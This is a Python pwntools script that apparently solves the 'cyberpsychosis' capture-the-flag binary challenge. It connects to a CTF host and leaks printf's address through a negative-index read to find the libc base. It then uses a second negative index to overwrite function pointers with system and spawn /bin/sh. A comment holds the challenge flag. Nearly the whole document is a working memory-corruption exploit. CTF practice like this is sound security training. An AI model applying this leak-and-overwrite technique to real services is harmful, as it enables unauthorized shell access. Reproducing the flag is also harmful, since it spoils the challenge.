#!/usr/bin/env python3

from pwn import *
import sys
from typing import Union

binary = ELF("./cyberpsychosis_patched")
libc = ELF("./libc.so.6")

context.binary = binary
context.terminal = ["tmux", "splitw", "-h", "-e", "GDB=pwndbg"]


def one_gadget(filename: str) -> list:
    return [
        int(i) for i in __import__('subprocess').check_output(
            ['one_gadget', '--raw', filename]).decode().split(' ')
    ]


GDB_SCRIPT = '''
b *edit_info+220
b *show_info+334
'''.strip()


def conn() -> Union[process, remote]:
    io = None
    for arg in sys.argv[1:]:
        # ./solve <any option> d
        if arg == 'd':
            context.log_level = 'debug'
        # ./solve l
        if arg == 'l':
            io = process([binary.path])
        # ./solve g
        elif arg == 'g':
            io = gdb.debug([binary.path], gdbscript=GDB_SCRIPT)
    # $ ./solve
    if io is None:
        io = remote("ctf.adl.tw", 10004)
    return io


def main():

    io = conn()

    io.sendlineafter(b"> ", b"1")

    io.sendlineafter(b"> ", b"-3")

    io.recvuntil(b"implanted name: ")
    leaked = io.recvuntil(b"\nvalue: ", drop=True)
    info(f"leaked: {leaked}  {int.from_bytes(leaked, 'little'):#x}")
    printf_addr = int(io.recvline().strip())
    info(f"printf address: {printf_addr:#x}")

    libc.address = printf_addr - libc.symbols["printf"]
    success(f"libc base: {libc.address:#x}")
    success(f"system address: {libc.symbols['system']:#x}")

    io.sendlineafter(b"> ", b"2")

    io.sendlineafter(b"> ", b"-2")

    io.sendafter(b": ",
                 p64(libc.symbols['setvbuf']) + p64(libc.symbols['system']))

    io.sendlineafter(b": ", b"/bin/sh")

    io.interactive()  # ADL{月一緒に行けなって ごめんね.https://youtu.be/h4VJGNNSQnw}


if __name__ == "__main__":
    main()
